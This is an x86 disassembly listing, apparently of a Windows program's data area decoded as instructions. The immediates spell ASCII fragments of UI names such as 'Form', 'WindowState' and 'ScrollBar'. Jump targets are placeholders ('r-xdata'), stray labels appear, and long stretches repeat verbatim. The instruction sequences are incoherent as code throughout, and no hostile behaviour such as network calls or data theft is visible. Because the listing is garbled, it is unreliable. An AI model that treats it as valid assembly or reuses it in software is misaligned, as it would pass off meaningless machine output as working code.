add [ ebx ] al
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
jae r-xdata
jo r-xdata
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
outsb
je r-xdata
inc esi
add [ ebx ] al
or edx [ edx + eax * 2 + 0x6f ]
jb r-xdata
lea eax [ eax ]
or al 0x4b
inc esi
outsd
jb r-xdata
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
dec esp
inc esi
add [ ebx ] al
andps xmm0 [ ebp + 0x66 ]
push esp
push eax
dec edi
ja r-xdata
jb r-xdata
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] al
adc [ eax ] al
nop
jl r-xdata
jae r-xdata
outsb
je r-xdata
outsd
insb
popad
outsb
outsb
je r-xdata
outsd
outsd
insb
push ecx
jne r-xdata
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
jb r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
add [ eax ] al
add [ eax + 0x600464c ] ch
jae r-xdata
dec ebx
inc esi
add [ ebx ] al
or [ eax + edx * 2 + 0x6f ] edx
jae r-xdata
jb r-xdata
inc esi
outsd
jb r-xdata
inc edi
inc esi
in al dx
add [ esp + eax * 2 ] al
popad
je r-xdata
pop es
inc esi
add [ eax ] cl
push cs
push esp
push ebx
push 0x4374726f
jne r-xdata
add cl [ eax ]
push es
jpo r-xdata
add [ edi + edi * 2 ] al
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4f ] dl
inc esi
add ah dh
push eax
inc esi
add [ eax ] al
add [ eax ] al
cmp al 0x10
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
pop esp
dec esi
jbe r-xdata
popad
outsb
add [ eax ] al
jb r-xdata
adc [ eax + 0x6f ] esi
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
insd
outsd
add [ eax ] al
pushad
jae r-xdata
add al ah
sbb al [ edx ]
push eax
jge r-xdata
pop es
dec ecx
outsb
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] al
push 0x3c004010
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x4e5c0040 ] cl
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
mov eax [ esi ]
test al 0x1b
inc ebp
add [ eax + 0x4400455e ] cl
pop edi
inc ebp
add [ eax + 0x5a ] al
inc ebp
add [ eax ] ch
pop edi
inc ebp
add ah al
jpe r-xdata
add [ eax - 0x63ffba9a ] al
imul eax [ ebp ] 0xffffffe8
push 0x45
add [ eax - 0x3ffbb15 ] bl
pushad
inc ebp
add ah cl
xchg [ esi ] eax
xor al 0x5e
inc ebp
add al ah
0xeae40044 0x44
dec eax
popad
outsb
insb
pop es
inc edx
pop es
add [ eax ] al
add [ eax ] al
add [ edx + 0x4f ] dh
inc esi
add dl ah
push eax
inc esi
add al bh
add al [ eax ]
add ah ch
outsb
je r-xdata
jo r-xdata
inc ebp
jbe r-xdata
outsb
je r-xdata
inc esi
add ah dh
xor al 0x40
add [ eax - 0x5d ] dh
inc esi
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ edi + edi * 2 + 0x46 ] ch
add [ ebx + ebp * 2 + 0x45 ] ch
add ah bl
test [ esi ] al
lodsb [ esi ]
pop [ ecx ]
sub al 0x81
inc esi
add [ eax - 0x7f ] ch
inc esi
add [ edx + eax * 4 + 0x46 ] dh
add [ esi + esi * 8 ] bh
inc esp
add al bh
sbb al [ edx ]
in al dx
mov al [ esi ]
fcom [ edi ]
inc edx
add [ esi + eax * 8 + 0x7bc40046 ] cl
inc esi
add al 0x7f
jb r-xdata
add [ esi ] 0xcc
add al dl
xchg ecx eax
inc esi
add ah dh
xor al 0x45
add [ esi + ebx * 4 - 0x5e0bffba ] dl
inc esi
add [ eax - 0x73ffb960 ] dh
xor eax 0x35900045
inc ebp
add [ ebx ] ch
inc esi
add al dh
xor eax [ ebp ]
push 0x20004560
stosb [ edi ]
inc esi
add [ edx + esi * 2 + 0x45 ] bl
add ah ah
pop esp
inc ebp
add [ edi + edi * 4 ] dh
inc esi
add [ eax + 0x68004674 ] bh
ja r-xdata
inc ebx
outsd
insd
add [ edi ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax 0x800464d
or dl [ eax + ecx * 2 + 0x65 ]
insb
outsb
je r-xdata
dec esp
inc esi
add [ eax ] cl
or edx [ ebx + eax * 2 + 0x6c ]
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
add [ esi ] 0x14
retn
add [ eax + esi * 4 ] dl
inc esi
add [ eax - 0x80 ] dl
inc esi
add ah cl
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
inc edx
outsd
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
sub_464701
mov esp 0x1004670
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
xor al 0x0
add bh bh
add [ ecx + 0x46 ] dh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
add eax 0x6c797453
cmp al 0x10
inc eax
add [ eax ] bh
add [ eax ] al
[ eax ]
jno r-xdata
inc esi
add [ ecx ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or [ eax + ebp * 2 + 0x75 ] edx
insd
bound edx [ ebx + 0x69 ]
jpe r-xdata
add ah ch
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add ah cl
cmp eax [ ebp ]
dec eax
xor al [ eax ]
xor al [ fs : eax ]
or al 0x74
inc esi
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edi + eax * 2 + 0x77080046 ] ah
jae r-xdata
inc esi
add [ eax ] cl
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ eax + 0x3004647 ] ch
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
add [ eax ] dl
inc eax
add [ 0x1dff0000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
push 0x45
add [ eax - 0x3ffbb15 ] bl
pushad
inc ebp
add [ ecx ] bl
inc ebp
add [ esi + ebx * 2 ] dh
inc ebp
add al ah
0xeae40044 0x44
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
xchg esp eax
jae r-xdata
mov eax 0x1ae00044
inc edx
outsd
jb r-xdata
inc ebp
add [ esi + esi * 8 ] bh
inc esp
add al bh
sbb al [ edx ]
loopne r-xdata
imul eax [ ebp ] 0xffffff94
xor eax [ ebp ]
lodsb [ esi ]
pop [ ecx ]
sub [ ecx ] bl
inc ebp
add [ ebp * 8 + 0x20480044 ] ah
dec esi
cmp al [ ebp ]
test al 0x1b
inc ebp
add [ eax + 0x4400455e ] cl
pop edi
inc ebp
add [ eax + 0x5a ] al
inc ebp
add [ eax ] ch
pop edi
inc ebp
add ah al
jpe r-xdata
add [ eax - 0x63ffba9a ] al
imul eax [ ebp ] 0xffffffe8
add [ ebx + ebp * 2 + 0x45 ] ch
add [ ebx + esi - 0x7053ffbb ] dl
inc ecx
add [ eax ] ch
sbb [ ebp ] eax
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
add [ 0x15011400 ] al
add [ eax - 0xbffb98c ] bl
xor al 0x45
add [ eax + 0x74 ] cl
inc esi
add ah bl
xor [ ebp ] eax
pop eax
je r-xdata
and al 0xed
inc esp
add [ eax + 0x20 ] cl
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
add [ eax + 0x3400467a ] ah
jpo r-xdata
add [ ebp + esi + 0x35900045 ] cl
inc ebp
add [ eax + 0x34 ] cl
inc ebp
add al dh
xor eax [ ebp ]
push 0x38004560
inc ebp
add [ edx + esi * 2 + 0x45 ] bl
add ah ah
pop esp
inc ebp
add ah dl
pop edi
inc ebp
add [ eax + 0x68004674 ] bh
ja r-xdata
inc edx
add al ah
pop ss
jae r-xdata
jb r-xdata
add [ eax + 0x79 ] bh
inc esi
add al bl
je r-xdata
adc al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
add [ eax + esi * 4 ] edi
in al dx
inc eax
jmp [ eax + 0x7c004679 ]
add [ ecx + edi * 2 + 0x60046 ] bl
add eax 0x15011400
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
push 0x1004671
sar [ eax ] 0x48
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx * 2 + 0x46 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx * 2 ] cl
inc esi
add [ edx ] dh
dec ecx
inc esi
add [ edx + eax ] bl
add [ eax ] al
push esp
add [ 0xffffffffc4000000 ] al
jae r-xdata
add [ eax ] cl
add al [ eax ]
call [ eax + 0x76 ]
inc esi
add [ esp + edx * 2 ] dl
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
jb r-xdata
outsd
insb
cmp [ eax + 0x46 ] cl
add [ eax ] cl
mov esp 0xd0044
add eax 0x6d726f46
jb r-xdata
imul edi [ edx + 0x65 ] 0x656c6261
or [ edx + 0x73 ] ah
inc esp
imul esp [ ecx + 0x6c ] 0x620c676f
inc ebp
inc esi
add [ ebp + eax * 2 + 0x2080046 ] bh
add bh bh
push eax
jbe r-xdata
jae r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
push esi
outsd
insb
nop
dec esp
dec ecx
inc esi
add [ edi ] al
jb r-xdata
je r-xdata
or dl [ esi + eax * 2 + 0x6f ]
jb r-xdata
jae r-xdata
dec eax
outsd
outsd
insb
push edi
imul ebp [ esi + 0x64 ] 0x620d776f
jae r-xdata
dec ecx
inc esi
add [ ebx ] al
adc [ esi + eax * 2 + 0x6f ] dl
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480d000b ] al
outsd
jb r-xdata
imul ebp [ esi + 0x43 ] 0x72746e6f
inc ebp
inc esi
add [ edx + eax ] cl
add bh bh
pushad
jbe r-xdata
add [ ebx ] al
or al 0x54
inc edx
outsd
jb r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
inc eax
add [ ecx ] al
jae r-xdata
outsd
imul edi [ eax + 0x6f ] 0x41
add [ ecx ] al
movsd [ edi ] [ esi ]
sbb eax 0x2bea1e43
out 0x4d eax
mov [ 0xfffffffffd45cc30 ] eax
das
mov cl 0xec
add eax 0x6d726f46
jae r-xdata
lea eax [ eax ]
pop eax
dec edx
insb
add [ gs : eax ] eax
add [ eax ] al
outsb
jne r-xdata
push ebx
je r-xdata
dec ecx
inc esi
add [ esi ] al
bound esi [ ebx + 0x4e ]
outsd
outsb
add eax 0xc4000000
inc esi
add [ edi ] cl
or eax 0x73654449
imul esp [ edi + 0x6e ] 0x6f487265
inc eax
add [ eax + 0x4a ] bl
invd
dec ecx
dec edi
insb
inc esi
add bh bh
dec [ ebx + 0x464a8cc0 ]
add [ edi ] cl
push ds
0xa34de72b 0xcc30
imul edi [ edx + 0x65 ] 0x6c6f6f54
push edi
imul ebp [ esi + 0x5 ] 0x6d726f46
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah al
dec ecx
inc esi
add [ 0x6d726f46 ] al
inc edx
outsd
jb r-xdata
or [ gs : edx + 0x73 ] ah
push ebx
imul ebp [ esi + 0x67 ] 0x620a656c
jae r-xdata
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560d000c ] al
shl ecx 0x2
int 0xda
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4605da82
jb r-xdata
add [ 0x7a726f48 ] cl
add [ ebx ] al
add [ eax ] al
add [ eax ] cl
dec ebx
inc esi
add [ edx ] cl
imul edx [ ebx + 0x79 ] 0x6d657473
jae r-xdata
jae r-xdata
dec edx
inc esi
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
popad
js r-xdata
bound ebp [ ecx + 0x4d ]
insb
add [ gs : eax ] eax
insd
and al 0x11
jb r-xdata
or [ ecx + 0x4f ] cl
je r-xdata
dec [ ebp + 0x4abc0040 ]
inc esi
add [ ebx ] al
add bh bh
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0x800464a ] bh
jae r-xdata
add [ eax ] eax
outsb
jb r-xdata
dec edi
insd
imul edi [ edx + 0x65 ] 0x48696206
bound ebp [ ecx + 0x53 ]
jns r-xdata
outsd
jb r-xdata
outsd
jb r-xdata
inc eax
add [ ebx + ecx * 2 ] cl
lea eax [ eax ]
mov esp 0x300464a
outsd
jb r-xdata
inc esi
outsd
push cs
jo r-xdata
mov eax eax
pop esp
dec ebx
inc esi
outsd
jb r-xdata
insb
je r-xdata
insb
jo r-xdata
push es
popad
insb
or ah [ esi + 0x73 ]
dec ebp
push eax
outsd
jb r-xdata
outsd
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
je r-xdata
add [ eax ] al
add eax [ eax ]
add [ eax ] al
or al 0x4c
inc esp
popa
jne r-xdata
jb r-xdata
insb
jns r-xdata
jae r-xdata
adc [ eax + 0x6f ] esi
jo r-xdata
outsb
or [ fs : eax + 0x6f ] esi
inc esp
popa
jne r-xdata
dec ebp
insd
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
outsd
jb r-xdata
jo r-xdata
je r-xdata
inc edx
arpl [ edi + 0x6e ] bp
add [ eax ] eax
add [ eax ] al
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
jo r-xdata
jb r-xdata
je r-xdata
je r-xdata
inc esi
add [ ecx ] cl
insd
inc esp
jae r-xdata
add [ eax ] al
add [ esp + ecx * 2 ] cl
je r-xdata
outsb
insb
jns r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
or al 0x54
rcr [ ebx + ecx * 2 + 0x46 ] 0x0
push es
inc esp
popa
inc esp
popa
jne r-xdata
adc [ esi + eax * 2 ] cl
je r-xdata
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsb
je r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ eax + 0x4b ] dh
inc esi
add [ edx ] cl
jo r-xdata
push es
add eax 0x6d726f46
jae r-xdata
nop
insd
popad
jb r-xdata
adc [ eax + 0x6f ] dh
jo r-xdata
inc esi
outsd
jb r-xdata
jae r-xdata
add ecx [ edi ]
push esp
imul edi [ edx + 0x65 ] 0x796c6e4f
dec ebx
inc esi
add [ eax + r-xdata ] dl
add ecx [ ecx ]
push esp
or [ ebx + 0x46 ] cl
popad
dec ebp
je r-xdata
push cs
je r-xdata
jne r-xdata
popad
je r-xdata
inc esi
add [ esi ] al
jns r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
inc esp
jae r-xdata
dec esp
inc eax
add ah dh
arpl [ ecx + 0x4e ] sp
outsd
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
inc esi
add [ esi ] al
inc esi
add [ esi ] al
jo r-xdata
dec esp
inc esi
add [ ebx ] al
or edx [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
outsd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
test al 0x4c
inc esp
jae r-xdata
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
lodsb [ esi ]
dec esp
inc esi
add [ ebx ] al
or al 0x54
inc ebx
insb
outsd
jae r-xdata
jb r-xdata
jo r-xdata
outsd
inc ebx
insb
push eax
jb r-xdata
jb r-xdata
outsd
outsb
inc esi
outsd
jae r-xdata
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
add eax 0x6d726f46
jo r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x4c ] ah
arpl [ ecx + 0x6c ] sp
inc ebx
outsb
je r-xdata
hlt
jo r-xdata
dec esi
outsd
outsb
push cs
inc ebx
insb
outsd
inc ebp
jbe r-xdata
inc ebp
jbe r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx ] al
inc eax
add [ eax - 0x72ffb9b4 ] ch
inc eax
add [ eax ] bh
dec ebp
inc esi
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or al 0x64
insd
add [ ebx ] al
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
jae r-xdata
jo r-xdata
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
outsb
je r-xdata
inc esi
add [ ebx ] al
or edx [ edx + eax * 2 + 0x6f ]
jb r-xdata
lea eax [ eax ]
or al 0x4b
inc esi
outsd
jb r-xdata
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
dec esp
inc esi
add [ ebx ] al
andps xmm0 [ ebp + 0x66 ]
push esp
push eax
dec edi
ja r-xdata
jb r-xdata
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] al
adc [ eax ] al
nop
jl r-xdata
jae r-xdata
outsb
je r-xdata
outsd
insb
popad
outsb
outsb
je r-xdata
outsd
outsd
insb
push ecx
jne r-xdata
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
jb r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
add [ eax ] al
add [ eax + 0x600464c ] ch
jae r-xdata
dec ebx
inc esi
add [ ebx ] al
or [ eax + edx * 2 + 0x6f ] edx
jae r-xdata
jb r-xdata
inc esi
outsd
jb r-xdata
inc edi
inc esi
in al dx
add [ esp + eax * 2 ] al
popad
je r-xdata
pop es
inc esi
add [ eax ] cl
push cs
push esp
push ebx
push 0x4374726f
jne r-xdata
add cl [ eax ]
push es
jpo r-xdata
add [ edi + edi * 2 ] al
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4f ] dl
inc esi
add ah dh
push eax
inc esi
add [ eax ] al
add [ eax ] al
cmp al 0x10
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
pop esp
dec esi
jbe r-xdata
popad
outsb
add [ eax ] al
jb r-xdata
adc [ eax + 0x6f ] esi
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
insd
outsd
add [ eax ] al
pushad
jae r-xdata
add al ah
sbb al [ edx ]
push eax
jge r-xdata
pop es
dec ecx
outsb
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] al
push 0x3c004010
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x4e5c0040 ] cl
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
mov eax [ esi ]
test al 0x1b
inc ebp
add [ eax + 0x4400455e ] cl
pop edi
inc ebp
add [ eax + 0x5a ] al
inc ebp
add [ eax ] ch
pop edi
inc ebp
add ah al
jpe r-xdata
add [ eax - 0x63ffba9a ] al
imul eax [ ebp ] 0xffffffe8
push 0x45
add [ eax - 0x3ffbb15 ] bl
pushad
inc ebp
add ah cl
xchg [ esi ] eax
xor al 0x5e
inc ebp
add al ah
0xeae40044 0x44
dec eax
popad
outsb
insb
pop es
inc edx
pop es
add [ eax ] al
add [ eax ] al
add [ edx + 0x4f ] dh
inc esi
add dl ah
push eax
inc esi
add al bh
add al [ eax ]
add ah ch
outsb
je r-xdata
jo r-xdata
inc ebp
jbe r-xdata
outsb
je r-xdata
inc esi
add ah dh
xor al 0x40
add [ eax - 0x5d ] dh
inc esi
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ edi + edi * 2 + 0x46 ] ch
add [ ebx + ebp * 2 + 0x45 ] ch
add ah bl
test [ esi ] al
lodsb [ esi ]
pop [ ecx ]
sub al 0x81
inc esi
add [ eax - 0x7f ] ch
inc esi
add [ edx + eax * 4 + 0x46 ] dh
add [ esi + esi * 8 ] bh
inc esp
add al bh
sbb al [ edx ]
in al dx
mov al [ esi ]
fcom [ edi ]
inc edx
add [ esi + eax * 8 + 0x7bc40046 ] cl
inc esi
add al 0x7f
jb r-xdata
add [ esi ] 0xcc
add al dl
xchg ecx eax
inc esi
add ah dh
xor al 0x45
add [ esi + ebx * 4 - 0x5e0bffba ] dl
inc esi
add [ eax - 0x73ffb960 ] dh
xor eax 0x35900045
inc ebp
add [ ebx ] ch
inc esi
add al dh
xor eax [ ebp ]
push 0x20004560
stosb [ edi ]
inc esi
add [ edx + esi * 2 + 0x45 ] bl
add ah ah
pop esp
inc ebp
add [ edi + edi * 4 ] dh
inc esi
add [ eax + 0x68004674 ] bh
ja r-xdata
inc ebx
outsd
insd
add [ edi ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax 0x800464d
or dl [ eax + ecx * 2 + 0x65 ]
insb
outsb
je r-xdata
dec esp
inc esi
add [ eax ] cl
or edx [ ebx + eax * 2 + 0x6c ]
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
add [ esi ] 0x14
retn
add [ eax + esi * 4 ] dl
inc esi
add [ eax - 0x80 ] dl
inc esi
add ah cl
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
inc edx
outsd
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
sub_465118
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
push edx
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx * 2 + 0x46 ] dl
add al bh
add al [ eax ]
add [ eax ] dl
dec esi
inc esi
add al ah
sbb al [ edx ]
push eax
jge r-xdata
jpo r-xdata
add [ edi + edi * 2 ] al
inc esi
add ah dh
xor al 0x40
add [ eax - 0x5d ] dh
inc esi
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ edi + edi * 2 + 0x46 ] ch
add [ ebx + ebp * 2 + 0x45 ] ch
add ah bl
test [ esi ] al
lodsb [ esi ]
pop [ ecx ]
sub al 0x81
inc esi
add [ eax - 0x7f ] ch
inc esi
add [ edx + eax * 4 + 0x46 ] dh
add [ esi + esi * 8 ] bh
inc esp
add al bh
sbb al [ edx ]
in al dx
mov al [ esi ]
fcom [ edi ]
inc edx
add [ esi + eax * 8 + 0x7bc40046 ] cl
inc esi
mov eax [ esi ]
test al 0x1b
inc ebp
add [ eax + 0x4400455e ] cl
pop edi
inc ebp
add [ eax + 0x5a ] al
inc ebp
add [ eax ] ch
pop edi
inc ebp
add ah al
jpe r-xdata
add [ eax - 0x63ffba9a ] al
imul eax [ ebp ] 0xffffffe8
push 0x45
add [ eax - 0x3ffbb15 ] bl
pushad
inc ebp
add ah cl
xchg [ esi ] eax
xor al 0x5e
inc ebp
add al ah
0xeae40044 0x44
add [ esi ] 0xcc
add al dl
xchg ecx eax
inc esi
add ah dh
xor al 0x45
add [ esi + ebx * 4 - 0x5e0bffba ] dl
inc esi
add [ eax - 0x73ffb960 ] dh
xor eax 0x35900045
inc ebp
add [ ebx ] ch
inc esi
add al dh
xor eax [ ebp ]
push 0x20004560
stosb [ edi ]
inc esi
add [ edx + esi * 2 + 0x45 ] bl
add ah ah
pop esp
inc ebp
add [ edi + edi * 4 ] dh
inc esi
add [ eax + 0x68004674 ] bh
ja r-xdata
insd
jae r-xdata
add [ esi ] 0x14
retn
add [ eax + esi * 4 ] dl
inc esi
add [ eax - 0x80 ] dl
inc esi
add ah cl
add [ ecx ] al
add ah ah
jb r-xdata
outsb
je r-xdata
add [ eax + eax ] bh
add dh bh
enter 0x44eb 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax 0x63410600
je r-xdata
test al 0x44
add [ ecx ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sldt [ 0x67696c41 ]
outsb
add [ eax ] dl
inc eax
add al ah
add al [ eax ]
outsd
insb
dec eax
mov eax [ 0x5b0044 ]
add bh bh
push 0x10044ed
popad
inc edx
insb
outsb
push esp
adc [ eax ] al
loope r-xdata
outsd
outsb
or [ esp + eax * 2 + 0x22000 ] bh
call esp
mov [ 0xffffffff96540046 ] eax
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x410d000e ] al
arpl [ ecx + ebp * 2 + 0x76 ] si
inc ebx
outsd
pop esp
xchg ebx eax
inc esi
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
call [ esi + esi * 2 ]
inc esi
add [ eax ] bh
xchg [ esi ] eax
add [ eax ] al
add [ eax + 0x1 ] al
adc eax [ eax ]
or al [ ecx + 0x75 ]
je r-xdata
cld
mov [ esi ] 0x1
add [ eax ] al
add [ eax + 0xff ] al
adc [ eax ] eax
cmovno ebp [ eax + esi * 2 + 0x68 ]
popad
inc edx
